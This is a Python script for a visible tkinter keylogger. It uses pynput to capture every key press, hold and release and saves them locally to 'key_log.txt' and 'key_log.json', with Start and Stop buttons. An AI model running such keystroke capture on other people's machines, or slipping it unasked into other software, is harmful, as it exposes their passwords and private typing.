import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', 'wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if not flag:
        keys_used.append(
            {'Pressed': f'{key}'}
        )
        flag = True

    if flag:
        keys_used.append(
            {'Held': f'{key}'}
        )
    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released': f'{key}'}
    )

    if flag:
        flag = False
    generate_json_file(keys_used)

    keys = keys + str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled', bg='grey')
    stop_button.config(state='normal', bg='red')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal', bg='green')
    stop_button.config(state='disabled', bg='grey')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack(pady=20)

# Create a frame to hold the buttons
button_frame = Frame(root)
button_frame.pack()

start_button = Button(button_frame, text="Start", command=start_keylogger, bg='green', fg='white')
start_button.pack(side=LEFT, padx=10)

stop_button = Button(button_frame, text="Stop", command=stop_keylogger, state='disabled', bg='grey', fg='white')
stop_button.pack(side=LEFT, padx=10)

# Center the frame horizontally
button_frame.place(relx=0.5, rely=0.5, anchor=CENTER)

root.geometry("300x200")

root.mainloop()
